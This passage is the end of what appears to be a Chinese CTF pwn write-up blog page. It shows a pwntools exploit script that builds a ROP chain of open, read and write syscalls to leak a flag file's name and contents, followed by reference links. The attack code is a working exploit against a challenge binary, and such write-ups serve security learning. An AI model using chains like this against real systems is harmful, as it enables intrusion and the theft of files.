</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(bss1)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">40</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;read&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">open current dir
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">open(flag_name(bss1),0,0)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rax=2;rdi=bss1;rsi=rdx=0
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rax_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(bss1)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(syscall_ret)
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">read flag to bss2
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">read(4,bss2,40)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rax=0;rdi=bss1;rsi=bss2;rdx=40
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rax_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">4</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(bss2)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0x100</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(syscall_ret)
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">output flag
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">write(1,bss2,40)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rax_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdi_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rsi_r15_ret)<span style="color:#ff79c6">+</span>p64(bss2)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(pop_rdx_r12_ret)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0x100</span>)<span style="color:#ff79c6">+</span>p64(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>pay<span style="color:#ff79c6">+=</span>p64(syscall_ret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;content?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>,pay)
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;you must be kidding</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>send(<span style="color:#f1fa8c">&#39;.&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;flag&#39;</span>)
</span></span><span style="display:flex;"><span>flag_name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;flag&#39;</span><span style="color:#ff79c6">+</span>p<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">32</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;flag name: &#39;</span><span style="color:#ff79c6">+</span>flag_name)
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#39;you must be kidding</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>,flag_name<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(p<span style="color:#ff79c6">.</span>recv())
</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>interactive()
</span></span></code></pre></div><p>参考：
官方wp</p>
<p><a href="https://bbs.pediy.com/thread-267566-1.htm">https://bbs.pediy.com/thread-267566-1.htm</a>
<a href="https://blog.csdn.net/cnbird2008/article/details/11629095">https://blog.csdn.net/cnbird2008/article/details/11629095</a>
<a href="https://blog.csdn.net/shanshanpt/article/details/39852249">https://blog.csdn.net/shanshanpt/article/details/39852249</a>
<a href="https://blog.csdn.net/u012763794/article/details/78777938">https://blog.csdn.net/u012763794/article/details/78777938</a></p>

        </p>
    </div>
</div>

<aside class="post-toc">
    <nav id="toc">
        <nav id="TableOfContents"></nav>
    </nav>
</aside>



    

        </main><footer class="footer">
    <span>&copy; 2023 </span>
    <span>
        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
    </span>
</footer>
</body>
</html>
